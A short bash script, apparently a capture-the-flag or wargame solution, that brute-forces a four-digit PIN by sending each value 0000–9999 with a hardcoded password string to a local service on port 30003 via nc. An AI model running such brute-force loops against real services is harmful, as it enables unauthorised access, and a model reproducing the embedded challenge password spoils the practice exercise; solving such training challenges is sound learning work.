#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m" 
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

#Cntr_c handler
function ctrl_c(){
  echo -e "${redColour} [-] Exiting...\n\n${endColour}"
  exit 1
}

trap ctrl_c INT

# secuencia for 
host=localhost
port=30003
for pin in {0000..9999}
do
  echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $pin" | nc $host $port 
done

